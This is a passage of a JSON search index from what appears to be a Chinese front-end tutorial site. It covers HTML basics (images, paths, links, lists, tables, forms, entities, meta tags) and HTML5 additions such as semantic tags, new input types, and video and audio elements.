标签的必须属性，它用于指定图像文件的路径和文件名，所谓属性，简单理解就是属于这个图像标签的特性\",\"图像标签的其他属性：\",\"属性\",\"属性值\",\"说明\",\"src\",\"图片路径\",\"必须属性\",\"alt\",\"文本\",\"替换文本，图像不能显示时显示的文字\",\"title\",\"文本\",\"提示文本，鼠标放到图像上，显示的文字\",\"width\",\"像素\",\"设置图像的宽度\",\"height\",\"像素\",\"设置图像的高度\",\"border\",\"像素\",\"设置图像的边框粗细\",\"图像标签注意点：\",\"图像标签可以拥有多个属性，必须写在标签名的后面\",\"属性之间不分先后顺序，标签名与属性、属性与属性之间均以空格分开\",\"属性采取键值对的格式，即 key=\\\"value\\\" 的格式，属性 =\\\"属性值\\\"\"]},{\"header\":\"5.2 路径\",\"slug\":\"_5-2-路径\",\"contents\":[\"分为相对路径和绝对路径\"]},{\"header\":\"5.2.1 相对路径\",\"slug\":\"_5-2-1-相对路径\",\"contents\":[\"相对路径：以引用文件所在位置为参考基础而建立出的目录路径\",\"这里简单来说，就是图片相对于 HTML 页面的位置\",\"相对路径分类\",\"符号\",\"说明\",\"同级路径\",\"图像文件位于 HTML 文件同一级，如 <img src=\\\"baidu.gif\\\"/>\",\"下级路径\",\"/\",\"图像文件位于 HTML 文件下一级，如 <img src=\\\"images/baidu.gif\\\"/>\",\"上级路径\",\"../\",\"图像文件位于 HTML 文件上一级，如 <img src=\\\"../baidu.gif\\\"/>\",\"特点：相对路径是从代码所在的这个文件出发，去寻找目标文件的，而我们这里所说的上一级、下一级和同一级就是图片相对于 HTML 页面的位置\"]},{\"header\":\"5.2.2 绝对路径\",\"slug\":\"_5-2-2-绝对路径\",\"contents\":[\"绝对路径：是指目录下的绝对位置，直接到达目标位置，通常是从盘符开始的路径，例如，\\\"D:\\\\web\\\\img\\\\logo. gif\\\" 或完整的网络地址 \\\"http://www.itcast.cn/images/logo.gif\\\"\"]},{\"header\":\"5.3 常见的图片格式\",\"slug\":\"_5-3-常见的图片格式\",\"contents\":[\"jpg 格式： \",\"概述：扩展名为 .jpg 或 .jpeg ，是一种有损的压缩格式（把肉眼不容易观察出来的细节丢弃了）\",\"主要特点：支持的颜色丰富、占用空间较小、不支持透明背景、不支持动态图\",\"使用场景：对图片细节没有极高要求的场景，例如：网站的产品宣传图等。—— 该格式网页中很常见\",\"png 格式： \",\"概述：扩展名为 .png ，是一种无损的压缩格式，能够更高质量的保存图片\",\"主要特点：支持的颜色丰富、占用空间略大、支持透明背景、不支持动态图\",\"使用场景：想让图片有透明背景；想更高质量的呈现图片；例如 ：公司 logo 图、重要配图等\",\"bmp 格式： \",\"概述：扩展名为 .bmp ，不进行压缩的一种格式，在最大程度上保留图片更多的细节\",\"主要特点：支持的颜色丰富、保留的细节更多、占用空间极大、不支持透明背景、不支持动态图\",\"使用场景：对图片细节要求极高的场景，例如：一些大型游戏中的图片。（网页中很少使用）\",\"gif 格式： \",\"概述：扩展名为 .gif ，仅支持 256 种颜色，色彩呈现不是很完整\",\"主要特点：支持的颜色较少、支持简单透明背景、支持动态图\",\"使用场景：网页中的动态图片\",\"webp 格式： \",\"概述：扩展名为 .webp ，谷歌推出的一种格式，专门用来在网页中呈现图片\",\"主要特点：具备上述几种格式的优点，但兼容性不太好，一旦使用务必要解决兼容性问题\",\"使用场景：网页中的各种图片\",\"base 64 格式 \",\"本质：一串特殊的文本，要通过浏览器打开，传统看图应用通常无法打开\",\"原理：把图片进行 base 64 编码，形成一串文本\",\"如何生成：靠一些工具或网站\",\"如何使用：直接作为 img 标签的 src 属性的值即可，并且不受文件位置的影响\",\"使用场景：一些较小的图片，或者需要和网页一起加载的图片\"]},{\"header\":\"6. 链接\",\"slug\":\"_6-链接\",\"contents\":[\"链接的语法格式: <a href=\\\"跳转目标\\\" target=\\\"目标窗口的弹出方式\\\"> 文本或图像 </a>\",\"属性：\",\"href：用于指定链接目标的 url 地址\",\"target: 用于指定链接页面的打开方式，_self 默认值，_blank 新窗口打开\",\"#: 空链接\",\"链接分类：\",\"外部链接: 例如 <a href=\\\"http://www.baidu.com\\\">百度</a>\",\"内部链接: 网站内部页面之间的相互链接。直接链接内部页面名称即可，例如 <a href=\\\"index.html\\\">首页</a>\",\"空链接: 如果当时没有确定链接目标时，<a href=\\\"#\\\">首页</a>\",\"下载链接: 如果 href 里面地址是一个文件或者压缩包，会下载这个文件\",\"网页元素链接: 在网页中的各种网页元素，如文本、图像、表格、音频、视频等都可以添加超链接\",\"锚点链接: 点我们点击链接, 可以快速定位到页面中的某个位置，在链接文本的 href 属性中，设置属性值为 #名字 的形式，如 <a href=\\\"#two\\\">第2集</a>，找到目标位置标签，里面添加一个 id属性 = 刚才的名字，如：<h3 id=\\\"two\\\">第2集介绍</h3>\"]},{\"header\":\"7. 列表\",\"slug\":\"_7-列表\",\"contents\":[\"表格是用来显示数据的，那么列表就是用来布局的\",\"列表最大的特点就是整齐、整洁、有序，它作为布局会更加自由和方便\",\"根据使用情景不同，列表可以分为三大类：无序列表、有序列表和自定义列表\"]},{\"header\":\"7.1 无序列表\",\"slug\":\"_7-1-无序列表\",\"contents\":[\"<ul> 标签表示 HTML 页面中项目的无序列表，一般会以项目符号呈现列表项，而列表项使用 <li> 标签定义\",\"无序列表的基本语法格式如下：\",\"<ul> <li>列表项1</li> <li>列表项2</li> <li>列表项3</li> ... </ul> \",\"无序列表的各个列表项之间没有顺序级别之分，是并列的\",\"<ul></ul> 中只能嵌套 <li></li>，直接在 <ul></ul> 标签中输入其他标签或者文字的做法是不被允许的\",\"<li> 与 </li> 之间相当于一个容器，可以容纳所有元素\",\"无序列表会带有自己的样式属性，但在实际使用时，我们会使用 CSS 来设置\"]},{\"header\":\"7.2 有序列表\",\"slug\":\"_7-2-有序列表\",\"contents\":[\"有序列表即为有排列顺序的列表，其各个列表项会按照一定的顺序排列定义。在 HTML 标签中，<ol> 标签用于定义有序列表，列表排序以数字来显示，并且使用 <li> 标签来定义列表项\",\"有序列表的基本语法格式如下：\",\"<ol> <li>列表项1</li> <li>列表项2</li> <li>列表项3</li> ... </ol> \",\"<ol></ol> 中只能嵌套 <li></li>，直接在 <ol></ol> 标签中输入其他标签或者文字的做法是不被允许的\",\"<li> 与 </li> 之间相当于一个容器，可以容纳所有元素\",\"有序列表会带有自己样式属性，但在实际使用时，我们会使用 CSS 来设置\"]},{\"header\":\"7.3 自定义列表\",\"slug\":\"_7-3-自定义列表\",\"contents\":[\"自定义列表的使用场景: 自定义列表常用于对术语或名词进行解释和描述，定义列表的列表项前没有任何项目符号。在 HTML 标签中，<dl> 标签用于定义描述列表（或定义列表），该标签会与 <dt>（定义项目/名字）和 < dd>（描述每一个项目/名字）一起使用\",\"语法如下：\",\"<dl> <dt>名词1</dt> <dd>名词1解释1</dd> <dd>名词1解释2</dd> </dl> \"]},{\"header\":\"8. 表格\",\"slug\":\"_8-表格\",\"contents\":[]},{\"header\":\"8.1 基本结构\",\"slug\":\"_8-1-基本结构\",\"contents\":[\"一个完整的表格由：表格标题、表格头部、表格主体、表格脚注，四部分组成\",\"HTML基础01.png\",\"表格涉及到的标签：\",\"标签\",\"含义\",\"table\",\"表格\",\"caption\",\"表格标题\",\"thead\",\"表格头部\",\"tbody\",\"表格主体\",\"tfoot\",\"表格注脚\",\"tr\",\"每一行\",\"th、td\",\"每一个单元格（备注：表格头部中用 th，表格主体、表格脚注中用 td）\",\"HTML基础02.png\",\"HTML基础03.png\",\"HTML基础04.png\"]},{\"header\":\"8.2 常用属性\",\"slug\":\"_8-2-常用属性\",\"contents\":[\"table 标签（表格）\",\"属性\",\"含义\",\"width\",\"设置表格宽度\",\"height\",\"设置表格最小高度，表格最终高度可能比设置的值大\",\"border\",\"设置表格边框宽度\",\"cellspacing\",\"设置单元格之间的间距\",\"thead 标签（表格头部）\",\"属性\",\"含义\",\"height\",\"设置表格头部高度\",\"align\",\"设置单元格的水平对齐方式，可选 left、center、right\",\"valign\",\"设置单元格的垂直对齐方式，可选 top、middle、bottom\",\"tbody 标签（表格主体）、tr 标签（行）、tfoot 标签（表格脚注）常用属性与 thead 相同\",\"td 标签（普通单元格）\",\"属性\",\"含义\",\"width\",\"设置单元格的宽度，同列所有单元格全都受影响\",\"height\",\"设置单元格的高度，同行所有单元格全都受影响\",\"align\",\"设置单元格的水平对齐方式\",\"valign\",\"设置单元格的垂直对齐方式\",\"rowspan\",\"指定要跨的行数\",\"colspan\",\"指定要跨的列数\",\"注意：\",\"<table> 元素的 border 属性可以控制表格边框，但 border 值的大小，并不控制单元格边框的宽度，只能控制表格最外侧边框的宽度\",\"默认情况下，每列的宽度，得看这一列单元格最长的那个文字\",\"给某个 th 或 td 设置了宽度之后，他们所在的那一列的宽度就确定了\",\"给某个 th 或 td 设置了高度之后，他们所在的那一行的高度就确定了\"]},{\"header\":\"8.3 跨行跨列\",\"slug\":\"_8-3-跨行跨列\",\"contents\":[\"rowspan ：指定要跨的行数\",\"colspan ：指定要跨的列数\"]},{\"header\":\"9. 换行标签\",\"slug\":\"_9-换行标签\",\"contents\":[\"在 HTML 中，一个段落中的文字会从左到右依次排列，直到浏览器窗口的右端，然后才自动换行。如果希望某段文本强制换行显示，就需要使用换行标签 <br/>\",\"特点：\",\"<br/> 是个单标签\",\"<br/> 标签只是简单地开始新的一行，跟段落不一样，段落之间会插入一些垂直的间距\"]},{\"header\":\"10. 分隔线\",\"slug\":\"_10-分隔线\",\"contents\":[\"<hr> 分隔线，单标签\",\"<hr> 的语义是分隔，如果不想要语义，只是想画一条水平线，那么应当使用 CSS 完成\"]},{\"header\":\"11. 表单\",\"slug\":\"_11-表单\",\"contents\":[\"概念：一个包含交互的区域，用于收集用户提供的数据\"]},{\"header\":\"11.1 基本结构\",\"slug\":\"_11-1-基本结构\",\"contents\":[\"<form action=\\\"https://www.baidu.com/s\\\" target=\\\"_blank\\\" method=\\\"get\\\"> <input type=\\\"text\\\" name=\\\"wd\\\" /> <button>去百度搜索</button> </form> \",\"form 标签（表单），双标签\",\"属性\",\"含义\",\"action\",\"用于指定表单的提交地址\",\"target\",\"用于控制表单提交后，如何打开页面，常用值如下：_self 在本窗口打开，_blank 在新窗口打开\",\"method\",\"用于控制表单的提交方式\",\"input 标签（输入框），单标签\",\"属性\",\"含义\",\"type\",\"设置输入框的类型，目前用到的值是 text ，表示普通文本\",\"name\",\"用于指定提交数据的名字\"]},{\"header\":\"11.2 常用表单控件\",\"slug\":\"_11-2-常用表单控件\",\"contents\":[]},{\"header\":\"11.2.1 文本输入框\",\"slug\":\"_11-2-1-文本输入框\",\"contents\":[\"<input type=\\\"text\\\"> \",\"常用属性如下：\",\"name 属性：数据的名称\",\"value 属性：输入框的默认输入值\",\"maxlength 属性：输入框最大可输入长度\"]},{\"header\":\"11.2.2 密码输入框\",\"slug\":\"_11-2-2-密码输入框\",\"contents\":[\"<input type=\\\"password\\\"> \",\"常用属性如下：\",\"name 属性：数据的名称\",\"value 属性：输入框的默认输入值（一般不用，无意义）\",\"maxlength 属性：输入框最大可输入长度\"]},{\"header\":\"11.2.3 单选框\",\"slug\":\"_11-2-3-单选框\",\"contents\":[\"<input type=\\\"radio\\\" name=\\\"sex\\\" value=\\\"female\\\">女 <input type=\\\"radio\\\" name=\\\"sex\\\" value=\\\"male\\\">男 \",\"常用属性如下：\",\"name 属性：数据的名称，注意：想要单选效果，多个 radio 的 name 属性值要保持一致\",\"value 属性：提交的数据值\",\"checked 属性：让该单选按钮默认选中\"]},{\"header\":\"11.2.4 复选框\",\"slug\":\"_11-2-4-复选框\",\"contents\":[\"<input type=\\\"checkbox\\\" name=\\\"hobby\\\" value=\\\"sing\\\">唱 <input type=\\\"checkbox\\\" name=\\\"hobby\\\" value=\\\"dance\\\">跳 <input type=\\\"checkbox\\\" name=\\\"hobby\\\" value=\\\"rap\\\">rap \",\"常用属性如下：\",\"name 属性：数据的名称\",\"value 属性：提交的数据值\",\"checked 属性：让该复选框默认选中\"]},{\"header\":\"11.2.5 隐藏域\",\"slug\":\"_11-2-5-隐藏域\",\"contents\":[\"<input type=\\\"hidden\\\" name=\\\"tag\\\" value=\\\"100\\\"> \",\"用户不可见的一个输入区域，作用是： 提交表单的时候，携带一些固定的数据\",\"常用属性如下：\",\"name 属性：指定数据的名称\",\"value 属性：指定的是真正提交的数据\"]},{\"header\":\"11.2.6 提交按钮\",\"slug\":\"_11-2-6-提交按钮\",\"contents\":[\"<input type=\\\"submit\\\" value=\\\"点我提交表单\\\"> <button>点我提交表单</button> \",\"注意：\",\"button 标签 type 属性的默认值是 submit\",\"button 不要指定 name 属性\",\"input 标签编写的按钮，使用 value 属性指定按钮文字\"]},{\"header\":\"11.2.7 重置按钮\",\"slug\":\"_11-2-7-重置按钮\",\"contents\":[\"<input type=\\\"reset\\\" value=\\\"点我重置\\\"> <button type=\\\"reset\\\">点我重置</button> \",\"注意：\",\"button 不要指定 name 属性\",\"input 标签编写的按钮，使用 value 属性指定按钮文字\"]},{\"header\":\"11.2.8 普通按钮\",\"slug\":\"_11-2-8-普通按钮\",\"contents\":[\"<input type=\\\"button\\\" value=\\\"普通按钮\\\"> <button type=\\\"button\\\">普通按钮</button> \",\"注意：普通按钮的 type 值为 button ，若不写 type 值是 submit 会引起表单的提交\"]},{\"header\":\"11.2.9 文本域\",\"slug\":\"_11-2-9-文本域\",\"contents\":[\"<textarea name=\\\"msg\\\" rows=\\\"22\\\" cols=\\\"3\\\">我是文本域</textarea> \",\"常用属性如下：\",\"rows 属性：指定默认显示的行数，会影响文本域的高度\",\"cols 属性：指定默认显示的列数，会影响文本域的宽度\",\"不能编写 type 属性，其他属性，与普通文本输入框一致\"]},{\"header\":\"11.2.10 下拉框\",\"slug\":\"_11-2-10-下拉框\",\"contents\":[\"<select name=\\\"from\\\"> <option value=\\\"黑\\\">黑龙江</option> <option value=\\\"吉\\\">吉林</option> <option value=\\\"辽\\\">辽宁</option> </select> \",\"常用属性及注意事项：\",\"name 属性：指定数据的名称\",\"option 标签设置 value 属性，如果没有 value 属性，提交的数据是 option 中间的文字；如果设置了 value 属性，提交的数据就是 value 的值（建议设置 value 属性）\",\"option 标签设置了 selected 属性，表示默认选中\"]},{\"header\":\"11.2.11 禁用表单控件\",\"slug\":\"_11-2-11-禁用表单控件\",\"contents\":[\"给表单控件的标签设置 disabled 既可禁用表单控件\",\"input 、 textarea 、 button 、 select 、 option 都可以设置 disabled 属性\"]},{\"header\":\"11.3 label 标签\",\"slug\":\"_11-3-label-标签\",\"contents\":[\"label 标签可与表单控件相关联，关联之后点击文字，与之对应的表单控件就会获取焦点\",\"两种与 label 关联方式如下：\",\"让 label 标签的 for 属性的值等于表单控件的 id\",\"把表单控件套在 label 标签的里面\"]},{\"header\":\"11.4 fieldset 与 legend 的使用\",\"slug\":\"_11-4-fieldset-与-legend-的使用\",\"contents\":[\"fieldset 可以为表单控件分组、 legend 标签是分组的标题\"]},{\"header\":\"12. 框架标签\",\"slug\":\"_12-框架标签\",\"contents\":[\"标签名\",\"功能和语义\",\"属性\",\"单/双标签\",\"iframe\",\"框架（在网页中嵌入其他文件）\",\"name: 框架名字，可以与 target 属性配合width：框架的宽度height：框架的高度frameborder：是否显示边框，值为 0 或 1\",\"双\",\"iframe 标签的实际应用：\",\"在网页中嵌入广告\",\"与超链接或表单的 target 配合，展示不同的内容\"]},{\"header\":\"13. HTML 实体\",\"slug\":\"_13-html-实体\",\"contents\":[\"在 HTML 中我们可以用一种 特殊的形式 的内容，来表示某个符号，这种特殊形式的内容，就是 HTML 实体。比如小于号 < 用于定义 HTML 标签的开始。如果我们希望浏览器正确地显示这些字符，我们必须在 HTML 源码中插入字符实体\",\"字符实体由三部分组成：一个 & 和一个实体名称（或者一个 # 和一个实体编号），最后加上一个分号 ;\",\"常见的字符实体：\",\"描述\",\"实体名称\",\"实体编号\",\"空格\",\"&nbsp;\",\"&#160;\",\"<\",\"小于号\",\"&lt;\",\"&#60;\",\">\",\"大于号\",\"&gt;\",\"&#62;\",\"&\",\"和号\",\"&amp;\",\"&#38;\",\"\\\"\",\"引号\",\"&quot;\",\"&#34;\",\"￥\",\"元（yen）\",\"&yen;\",\"&#165;\",\"©\",\"版权（copyright）\",\"&copy;\",\"&#169;\",\"×\",\"乘号\",\"&times;\",\"&#215;\",\"÷\",\"除号\",\"&divide;\",\"&#247;\"]},{\"header\":\"14. HTML 全局属性\",\"slug\":\"_14-html-全局属性\",\"contents\":[\"常用的全局属性：\",\"属性名\",\"含义\",\"id\",\"给标签指定唯一标识，注意：id 是不能重复的。作用：可以让 label 标签与表单控件相关联；也可以与 CSS、JavaScript 配合使用\",\"class\",\"给标签指定类名，随后通过 CSS 就可以给标签设置样式\",\"style\",\"给标签设置 CSS 样式\",\"dir\",\"内容的方向，值: ltr、rtl\",\"title\",\"给标签设置一个文字提示，一般超链接和图片用得比较多\",\"lang\",\"给标签指定语\"]},{\"header\":\"15. meta 元信息\",\"slug\":\"_15-meta-元信息\",\"contents\":[\"配置字符编码\",\"<meta charset=\\\"UTF-8\\\"> \",\"针对 IE 浏览器的兼容性配置\",\"<meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\"> \",\"针对移动端的配置\",\"<meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\"> \",\"配置网页关键字\",\"<meta name=\\\"keywords\\\" content=\\\"8-12个以英文逗号隔开的单词/词语\\\"> \",\"配置网页描述信息\",\"<meta name=\\\"description\\\" content=\\\"80字以内的一段话，与网站内容相关\\\"> \",\"针对搜索引擎爬虫配置\",\"<meta name=\\\"robots\\\" content=\\\"此处可选值见下表\\\"> \",\"值\",\"描述\",\"index\",\"允许搜索爬虫索引此页面\",\"noindex\",\"要求搜索爬虫不索引此页面\",\"follow\",\"允许搜索爬虫跟随此页面上的链接\",\"nofollow\",\"要求搜索爬虫不跟随此页面上的链接\",\"all\",\"与 index，follow 等价\",\"none\",\"与 noindex，nofollow 等价\",\"noarchive\",\"要求搜索引擎不缓存页面内容\",\"nocache\",\"noarchive 的替代名称\",\"配置网页作者\",\"<meta name=\\\"author\\\" content=\\\"tony\\\"> \",\"配置网页生成工具\",\"<meta name=\\\"generator\\\" content=\\\"Visual Studio Code\\\"> \",\"配置定义网页版权信息\",\"<meta name=\\\"copyright\\\" content=\\\"2023-2027©版权所有\\\"> \",\"配置网页自动刷新\",\"<meta http-equiv=\\\"refresh\\\" content=\\\"10;url=http://www.baidu.com\\\"> \"]}]},\"/front-end/html-notes/06-HTML5%E7%AE%80%E4%BB%8B.html\":{\"title\":\"HTML5简介\",\"contents\":[{\"header\":\"1. 什么是HTML5\",\"slug\":\"_1-什么是html5\",\"contents\":[\"HTML5 是新一代的 HTML 标准，2014年10月由万维网联盟（ W3C ）完成标准制定\",\"HTML5 在狭义上是指新一代的 HTML 标准，在广义上是指：整个前端\"]},{\"header\":\"2. HTML5优势\",\"slug\":\"_2-html5优势\",\"contents\":[\"针对 JavaScript ，新增了很多可操作的接口\",\"新增了一些语义化标签、全局属性\",\"新增了多媒体标签，可以很好的替代 flash\",\"更加侧重语义化，对于 SEO 更友好\",\"可移植性好，可以大量应用在移动设备上\"]}]},\"/front-end/html-notes/07-HTML5%E6%96%B0%E5%A2%9E%E8%AF%AD%E4%B9%89%E5%8C%96%E6%A0%87%E7%AD%BE.html\":{\"title\":\"HTML5新增语义化标签\",\"contents\":[{\"header\":\"1. 新增布局标签\",\"slug\":\"_1-新增布局标签\",\"contents\":[\"<header> 头部标签\",\"<nav> 导航标签\",\"<article> 内容标签\",\"<section> 定义文档某个区域\",\"<aside> 侧边栏标签\",\"<footer> 尾部标签\",\"HTML5新增语义化标签01.png\",\"关于 article 和 section：\",\"artical 里面可以有多个 section\",\"section 强调的是分段或分块，如果你想将一块内容分成几段的时候，可使用 section 元素\",\"article 比 section 更强调独立性，一块内容如果比较独立、比较完整，应该使用 article 元素\"]},{\"header\":\"2. 新增状态标签\",\"slug\":\"_2-新增状态标签\",\"contents\":[]},{\"header\":\"2.1 meter 标签\",\"slug\":\"_2-1-meter-标签\",\"contents\":[\"语义：定义已知范围内的标量测量。也被称为 gauge （尺度），双标签，例如：电量、磁盘用量等\",\"常用属性如下：\",\"属性\",\"值\",\"描述\",\"high\",\"数值\",\"规定高值\",\"low\",\"数值\",\"规定低值\",\"max\",\"数值\",\"规定最大值\",\"min\",\"数值\",\"规定最小值\",\"optimum\",\"数值\",\"规定最优值\",\"value\",\"数值\",\"规定当前值\"]},{\"header\":\"2.2 progress 标签\",\"slug\":\"_2-2-progress-标签\",\"contents\":[\"语义：显示某个任务完成的进度的指示器，一般用于表示进度条，双标签，例如：工作完成进度等\",\"常用属性如下：\",\"属性\",\"值\",\"描述\",\"max\",\"数值\",\"规定目标值\",\"value\",\"数值\",\"规定当前值\"]},{\"header\":\"3. 新增列表标签\",\"slug\":\"_3-新增列表标签\",\"contents\":[\"标签名\",\"语义\",\"单/双标签\",\"datalist\",\"用于搜索框的关键字提示\",\"双\",\"details\",\"用于展示问题和答案，或对专有名词进行解释\",\"双\",\"summary\",\"写在 details 的里面，用于指定问题或专有名词\",\"双\"]},{\"header\":\"4. 新增文本标签\",\"slug\":\"_4-新增文本标签\",\"contents\":[]},{\"header\":\"4.1 文本注音\",\"slug\":\"_4-1-文本注音\",\"contents\":[\"标签名\",\"语义\",\"单/双标签\",\"ruby\",\"包裹需要注音的文字\",\"双\",\"rt\",\"写注音，rt 标签写在 ruby 的里面\",\"双\"]},{\"header\":\"4.2 文本标记\",\"slug\":\"_4-2-文本标记\",\"contents\":[\"标签名\",\"语义\",\"单/双标签\",\"mark\",\"标记\",\"双\",\"注意： W3C 建议 mark 用于标记搜索结果中的关键字\"]}]},\"/front-end/html-notes/08-HTML5%E6%96%B0%E5%A2%9E%E8%A1%A8%E5%8D%95%E7%9B%B8%E5%85%B3%E5%8A%9F%E8%83%BD.html\":{\"title\":\"HTML5新增表单相关功能\",\"contents\":[{\"header\":\"1. 表单控件新增属性\",\"slug\":\"_1-表单控件新增属性\",\"contents\":[\"属性\",\"值\",\"说明\",\"required\",\"required\",\"表单拥有该属性表示其内容不能为空，必填\",\"placeholder\",\"提示文本\",\"表单的提示信息，存在默认值将不显示\",\"autofocus\",\"autofocus\",\"自动聚焦属性，页面加载完成自动聚焦到指定表单\",\"autocomplete\",\"off/on\",\"当用户在字段开始键入时，浏览器基于之前键入过的值，应该显示出在字段中填写的选项。默认已经打开，需放在表单内，同时加上 name 属性，同时成功提交\",\"multiple\",\"multiple\",\"可以多选文件提交\",\"pattern\",\"regexp\",\"填写正则表达式，适用于文本输入类表单控件\",\"补充：通过如下方法可以设置 placeholder 里面的字体颜色\",\"input::placeholder{ color:pink; } \"]},{\"header\":\"2. input新增type属性值\",\"slug\":\"_2-input新增type属性值\",\"contents\":[\"在 HTML5 中，帮我们新增加了很多类型的表单\",\"案例代码：\",\"<!-- 我们验证的时候必须添加 form 表单域 --> <form action=\\\"\\\"> <ul> <li>邮箱: <input type=\\\"email\\\" /></li> <li>网址: <input type=\\\"url\\\" /></li> <li>日期: <input type=\\\"date\\\" /></li> <li>时间: <input type=\\\"time\\\" /></li> <li>数量: <input type=\\\"number\\\" /></li> <li>手机号码: <input type=\\\"tel\\\" /></li> <li>搜索: <input type=\\\"search\\\" /></li> <li>颜色: <input type=\\\"color\\\" /></li> <li>范围: <input type=\\\"range\\\" /></li> <!-- 当我们点击提交按钮就可以验证表单了 --> <li> <input type=\\\"submit\\\" value=\\\"提交\\\"></li> </ul> </form> \",\"常见输入类型：\",\"text password radio checkbox button file hidden submit reset image \",\"新的输入类型：\",\"属性值\",\"说明\",\"type=\\\"email\\\"\",\"限制用户输入必须为 email 类型\",\"type=\\\"url\\\"\",\"限制用户输入必须为 url 类型\",\"type=\\\"data\\\"\",\"限制用户输入必须为日期类型\",\"type=\\\"time\\\"\",\"限制用户输入必须为时间类型\",\"type=\\\"month\\\"\",\"限制用户输入必须为月份类型\",\"type=\\\"week\\\"\",\"限制用户输入必须为周类型\",\"type=\\\"number\\\"\",\"限制用户输入必须为数字类型\",\"type=\\\"tel\\\"\",\"手机号码\",\"type=\\\"search\\\"\",\"搜索框\",\"type=\\\"color\\\"\",\"生成一个颜色选择表单\",\"type=\\\"range\\\"\",\"范围选择框，默认值为 50 ，表单提交时不会验证格式\",\"type=\\\"datetime-local\\\"\",\"日期+时间选择框，默认值为空，表单提交时不会验证格式\"]},{\"header\":\"3. form 标签新增属性\",\"slug\":\"_3-form-标签新增属性\",\"contents\":[\"属性名\",\"功能\",\"novalidate\",\"如果给 form 标签设置了该属性，表单提交的时候不再进行验证\"]}]},\"/front-end/html-notes/09-HTML5%E6%96%B0%E5%A2%9E%E5%A4%9A%E5%AA%92%E4%BD%93%E6%A0%87%E7%AD%BE.html\":{\"title\":\"HTML5新增多媒体标签\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"多媒体标签分为音频 audio 和视频 video 两个标签，使用它们，我们可以很方便的在页面中嵌入音频和视频，而不再去使用落后的 flash 和其他浏览器插件了\"]},{\"header\":\"1. 视频标签-video\",\"slug\":\"_1-视频标签-video\",\"contents\":[]},{\"header\":\"1.1 基本使用\",\"slug\":\"_1-1-基本使用\",\"contents\":[\"当前 <video> 元素支持三种视频格式：尽量使用 mp4 格式的视频\",\"使用语法：\",\"<video src=\\\"文件地址\\\"></video> \",\"浏览器\",\"MP 4\",\"WebM\",\"Ogg\",\"Internet Explorer\",\"yes\",\"no\",\"no\",\"Chrome\",\"yes\",\"yes\",\"yes\",\"Firefox\",\"yes\",\"yes\",\"yes\",\"Safari\",\"yes\",\"no\",\"no\",\"Opera\",\"yes\",\"yes\",\"yes\"]},{\"header\":\"1.2 兼容写法\",\"slug\":\"_1-2-兼容写法\",\"contents\":[\"由于各个浏览器的支持情况不同，所以我们会有一种兼容性的写法，这种写法了解一下即可\",\"<video controls=\\\"controls\\\" width=\\\"300\\\"> <source src=\\\"move.ogg\\\" type=\\\"video/ogg\\\" > <source src=\\\"move.mp4\\\" type=\\\"video/mp4\\\" > 您的浏览器暂不支持 <video> 标签播放视频 </ video > \",\"上面这种写法，浏览器会匹配 video 标签中的 source，如果支持就播放，如果不支持往下匹配，直到没有匹配的格式，就提示文本\"]},{\"header\":\"1.3 video 常用属性\",\"slug\":\"_1-3-video-常用属性\",\"contents\":[\"属性\",\"值\",\"描述\",\"autoplay\",\"autoplay\",\"视频就绪自动播放（谷歌浏览器需要添加 muted 来解决自动播放的问题）\",\"controls\",\"controls\",\"向用户显示播放控件\",\"width\",\"px（像素）\",\"设置播放器宽度\",\"height\",\"px（像素）\",\"设置播放器高度\",\"loop\",\"loop\",\"播放完是否继续播放该视频，循环播放\",\"preload\",\"auto（预先加载视频）、none（不预先加载视频）\",\"规定是否预加载视频（如果有了 autoplay 就忽略该属性）\",\"src\",\"url\",\"视频 URL 地址\",\"poster\",\"imgurl\",\"加载等待的画面图片\",\"muted\",\"muted\",\"静音播放\",\"属性很多，需重点掌握：\",\"autoplay 自动播放 \",\"注意： 在 google 浏览器上面，默认禁止了自动播放，如果想要自动播放的效果，需要设置 muted 属性\",\"width 宽度\",\"height 高度\",\"loop 循环播放\",\"src 播放源\",\"muted 静音播放\",\"示例代码：\",\"<video src=\\\"media/mi.mp4\\\" autoplay=\\\"autoplay\\\" muted=\\\"muted\\\" loop=\\\"loop\\\" poster=\\\"media/mi.jpg\\\"></video> \"]},{\"header\":\"2. 音频标签-audio\",\"slug\":\"_2-音频标签-audio\",\"contents\":[]},{\"header\":\"2.1 基本使用\",\"slug\":\"_2-1-基本使用\",\"contents\":[\"当前 <audio> 元素支持三种视频格式：尽量使用 mp3 格式\",\"使用语法：\",\"<audio src=\\\"文件地址\\\"></audio> \",\"浏览器\",\"MP 3\",\"Wav\",\"Ogg\",\"Internet Explorer\",\"yes\",\"no\",\"no\",\"Chrome\",\"yes\",\"yes\",\"yes\",\"Firefox\",\"yes\",\"yes\",\"yes\",\"Safari\",\"yes\",\"yes\",\"no\",\"Opera\",\"yes\",\"yes\",\"yes\"]},{\"header\":\"2.2 兼容写法\",\"slug\":\"_2-2-兼容写法\",\"contents\":[\"由于各个浏览器的支持情况不同，所以我们会有一种兼容性的写法，这种写法了解一下即可\",\"< audio controls=\\\"controls\\\" > <source src=\\\"happy.mp3\\\" type=\\\"audio/mpeg\\\" > <source src=\\\"happy.ogg\\\" type=\\\"audio/ogg\\\" > 您的浏览器暂不支持 <audio> 标签。 </ audio> \",\"上面这种写法，浏览器会匹配 audio 标签中的 source，如果支持就播放，如果不支持往下匹配，直到没有匹配的格式，就提示文本\"]},{\"header\":\"2.3 audio 常用属性\",\"slug\":\"_2-3-audio-常用属性\",\"contents\":[\"属性\",\"值\",\"描述\",\"autoplay\",\"autoplay\",\"如果出现该属性，则音频在就绪后马上播放\",\"controls\",\"controls\",\"如果出现该属性，则向用户显示控件，比如播放按钮\",\"loop\",\"loop\",\"如果出现该属性，则每当音频结束时重新开始播放\",\"src\",\"url\",\"要播放的音频的 url\",\"示例代码：\",\"<audio src=\\\"media/music.mp3\\\" autoplay=\\\"autoplay\\\" controls=\\\"controls\\\"></audio> \"]},{\"header\":\"3. 小结\",\"slug\":\"_3-小结\",\"contents\":[\"音频标签和视频标签使用方式基本一致\",\"浏览器支持情况不同\",\"谷歌浏览器把音频和视频自动播放禁止了\",\"我们可以给视频标签添加 muted 属性来静音播放视频，音频不可以（可以通过 JavaScript 解决）\",\"视频标签是重点，我们经常设置自动播放，不使用 controls 